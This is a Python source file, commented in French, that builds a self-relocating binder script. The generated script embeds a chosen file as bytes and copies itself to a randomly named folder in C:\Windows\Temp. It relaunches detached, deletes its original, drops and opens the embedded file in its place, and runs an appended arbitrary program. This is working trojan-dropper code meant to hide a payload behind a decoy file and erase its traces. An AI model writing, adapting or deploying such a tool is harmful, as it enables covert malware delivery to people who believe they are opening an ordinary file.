# -*- coding: utf-8 -*-



import sys
# python3 <fichier_encapsule> <fichier/programme_python>

print(sys.argv)
input_file=sys.argv[1]
input_prog=sys.argv[2]
OUTPUT_EXTENSION=".py"
BYTESREADING_RATE=1024
NB_BYTESREADING_PER_LINE=10

p=open(input_prog,'r')
f=open(input_file,'rb')
of=open(input_file+OUTPUT_EXTENSION,'w')
#ftext=f.read(-1)

xchr_to_str_conversion=(lambda x:"\\"+(lambda h: h[0]+"0"+h[1] if len(h)==2 else h )(hex(x)[1:]))
#strbytearray=str.join("",list(map(lambda x:xchr_to_str_conversion(ord(x)),ftext)))


of.write("")
of.write("import sys\n")
of.write("import os\n")
of.write("import re\n")
of.write("import time\n")
of.write("import subprocess\n")
#of.write("import subprocess\n")
#of.write("encapsdatas=b'"+str(strbytearray)+"'\n")
of.write("encapsdatas=b'")
str_byterate_bytes=str.join("",list(map(lambda x:xchr_to_str_conversion(x),f.read(BYTESREADING_RATE))))
count_bytesreading=1
while str_byterate_bytes != "":
	of.write(str_byterate_bytes)
	if count_bytesreading%NB_BYTESREADING_PER_LINE==0:
		of.write("\\\n")
	str_byterate_bytes=str.join("",list(map(lambda x:xchr_to_str_conversion(x),f.read(BYTESREADING_RATE))))
	count_bytesreading+=1
f.close()
of.write("'\n")

TMP_DIR="C:\\\\Windows\\\\Temp\\\\opae-bfI5-6aSi-GqEU-2rVC-Wmbc-zGC6-dDJi-zP3c-bYsk\\\\"
TMP_FILE="qMOV-QJr0-unrO"
OPTION_REXEC="tmpexec="

of.write("regx_tmpcp=re.compile('^"+OPTION_REXEC+"')\n")
of.write("regx=re.compile('^[p|P]ython[0-9|.]*')\n")



of.write("if regx.match(sys.argv[0])==None:\n")
of.write("\tautormFile=sys.argv[0]\n")
of.write("else:\n")
of.write("\tautormFile=sys.argv[1]\n")
of.write("outFilePath=autormFile\n")


of.write("if regx_tmpcp.match(sys.argv[-1])==None:\n")#copy self on tmp file exec tmp prog with arg and stop execution
of.write("\ttry:\n")
of.write("\t\tos.mkdir(\""+TMP_DIR+"\")\n")
of.write("\t\tsys.path='"+TMP_DIR+"'\n")
of.write("\t\tcpexec_out=open(\""+TMP_DIR+TMP_FILE+"\",'wb')\n")
of.write("\t\tcpexec_in=open(autormFile,'rb')\n")
of.write("\t\treaded=cpexec_in.read("+str(BYTESREADING_RATE)+")\n")
of.write("\t\twhile readed!=b\'\':\n")
of.write("\t\t\tcpexec_out.write(readed)\n")
of.write("\t\t\treaded=cpexec_in.read("+str(BYTESREADING_RATE)+")\n")
of.write("\t\tcpexec_in.close()\n")
of.write("\t\tcpexec_out.close()\n")
of.write("\t\tsubprocess.Popen(['"+TMP_DIR+TMP_FILE+"','"+OPTION_REXEC+"'+outFilePath],close_fds=True,creationflags=subprocess.DETACHED_PROCESS)\n")
of.write("\texcept:\n")
of.write("\t\tNone\n")
of.write("\tsys.exit(0)\n")

of.write("autormFile=sys.argv[-1]["+str(len(OPTION_REXEC))+":]\n")
of.write("outFilePath=autormFile\n")


REPLACE_CASE=[".exe",".py",xchr_to_str_conversion(127)]
for i in range(0,32):
	REPLACE_CASE+=[xchr_to_str_conversion(i)]
for e in REPLACE_CASE:
	of.write("outFilePath=outFilePath.replace(\""+e+"\",'')\n")

of.write("removed=False\n")
of.write("while not(removed):\n")
of.write("\ttry:\n")
of.write("\t\tos.remove(autormFile)\n")
of.write("\t\tremoved=True\n")
of.write("\texcept:\n")
of.write("\t\ttime.sleep(0.3)\n")


of.write("outfile=open(outFilePath,'wb')\n")#out_encapsdatas have to be 
of.write("outfile.write(encapsdatas)\n")
of.write("outfile.close()\n")
of.write("os.startfile(outFilePath)\n")#work only on win sys
#TODO open outfile with system appropriate app

of.write(p.read(-1))
p.close()



of.close()
